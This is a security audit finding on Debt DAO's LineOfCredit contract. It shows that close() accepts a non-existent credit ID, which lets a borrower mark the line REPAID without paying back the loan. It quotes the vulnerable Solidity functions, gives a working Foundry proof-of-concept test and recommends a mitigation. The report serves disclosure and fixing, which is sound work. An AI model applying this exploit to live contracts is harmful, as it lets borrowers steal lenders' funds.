[H-04] Borrower can close a credit without repaying debt
Submitted byJeiwan, also found byjoestakey,berndartmueller,smiling_heretic,adriro,hansfriese, andbin2chen
A borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral.
Proof of Concept
Theclosefunction ofLineOfCreditdoesnâ€™t check whether a credit exists or not. As a result, thecountvariable is decreased in the internal_closefunction when theclosefunction is called with an non-existent credit ID:LineOfCredit.sol#L388:
functionclose(bytes32id)externalpayableoverridereturns(bool) {Creditmemorycredit=credits[id];addressb=borrower;// gas savingsif(msg.sender!=credit.lender&&msg.sender!=b) {revertCallerAccessDenied();}// ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid offcredit=_accrue(credit,id);uint256facilityFee=credit.interestAccrued;if(facilityFee>0) {// only allow repaying interest since they are skipping repayment queue.// If principal still owed, _close() MUST failLineLib.receiveTokenOrETH(credit.token,b,facilityFee);credit=_repay(credit,id,facilityFee);}_close(credit,id);// deleted; no need to save to storagereturntrue;}
LineOfCredit.sol#L483:
function_close(Creditmemorycredit,bytes32id)internalvirtualreturns(bool) {if(credit.principal>0) {revertCloseFailedWithPrincipal(); }// return the Lender's funds that are being repaidif(credit.deposit+credit.interestRepaid>0) {LineLib.sendOutTokenOrETH(credit.token,credit.lender,credit.deposit+credit.interestRepaid);}deletecredits[id];// gas refunds// remove from active listids.removePosition(id);unchecked{ --count; }// If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.if(count==0) {_updateStatus(LineLib.STATUS.REPAID); }emitCloseCreditPosition(id);returntrue;}
Proof of Concept:
// contracts/tests/LineOfCredit.t.solfunctiontestCloseWithoutRepaying_AUDIT()public{assertEq(supportedToken1.balanceOf(address(line)),0,"Line balance should be 0");assertEq(supportedToken1.balanceOf(lender),mintAmount,"Lender should have initial mint balance");_addCredit(address(supportedToken1),1ether);bytes32id=line.ids(0);assert(id!=bytes32(0));assertEq(supportedToken1.balanceOf(lender),mintAmount-1ether,"Lender should have initial balance less lent amount");hoax(borrower);line.borrow(id,1ether);assertEq(supportedToken1.balanceOf(borrower),mintAmount+1ether,"Borrower should have initial balance + loan");// The credit hasn't been repaid.// hoax(borrower);// line.depositAndRepay(1 ether);hoax(borrower);// Closing with a non-existent credit ID.line.close(bytes32(uint256(31337)));// The debt hasn't been repaid but the status is REPAID.assertEq(uint(line.status()),uint(LineLib.STATUS.REPAID));// Lender's balance is still reduced by the borrow amount.assertEq(supportedToken1.balanceOf(lender),mintAmount-1ether);// Borrower's balance still includes the borrowed amount.assertEq(supportedToken1.balanceOf(borrower),mintAmount+1ether);}
Recommended Mitigation Steps
In theclosefunction ofLineOfCredit, consider ensuring that a credit with the user-supplied ID exists, before closing it.
kibagateaux (Debt DAO) confirmed